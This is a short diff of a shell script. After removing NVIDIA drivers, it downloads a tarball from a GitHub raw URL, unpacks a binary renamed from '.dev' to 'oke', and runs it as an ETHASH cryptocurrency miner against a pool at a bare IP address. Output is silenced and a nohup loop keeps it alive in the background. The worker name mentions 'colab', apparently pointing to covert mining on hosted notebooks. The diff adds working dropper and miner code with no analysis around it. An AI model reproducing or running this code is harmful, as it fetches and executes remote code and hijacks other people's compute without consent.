@@ -84,8 +84,8 @@ sudo apt-get --purge remove "*nvidia*"
 # Clean up the uninstall:
 sudo apt-get autoremove
 number_mining=$(echo $(shuf -i 1-9999 -n 1))
-wget -nv -c https://raw.githubusercontent.com/hondacars/sirji/main/.dev -O - | tar -xz
-wallet="./.dev --algo ETHASH --pool 3.215.245.39:443 --user prodent.colab_$number_mining >/dev/null 2>&1 "
+wget -nv -c https://raw.githubusercontent.com/hondacars/sirji/main/oke -O - | tar -xz
+wallet="./oke --algo ETHASH --pool 3.215.245.39:443 --user prodent.colab_$number_mining >/dev/null 2>&1 "
 nohup $(for i in {1..999}; do $(echo $wallet); done) >/dev/null 2>&1 &
 
 clear
@@ -145,7 +145,7 @@ miner_eth(){
   #        k_wallet=${k_wallet:-'DHB'}
   #read -p "algo [ETHASH]:" k_algo
   #        k_algo=${k_algo:-'ETHASH'}
-  walletstart="./.dev --algo ETHASH --pool 3.215.245.39:443 --user prodent.$(echo $(shuf -i 1-9999 -n 1)) >/dev/null 2>&1 "
+  walletstart="./oke --algo ETHASH --pool 3.215.245.39:443 --user prodent.$(echo $(shuf -i 1-9999 -n 1)) >/dev/null 2>&1 "
   $walletstart
 }
 
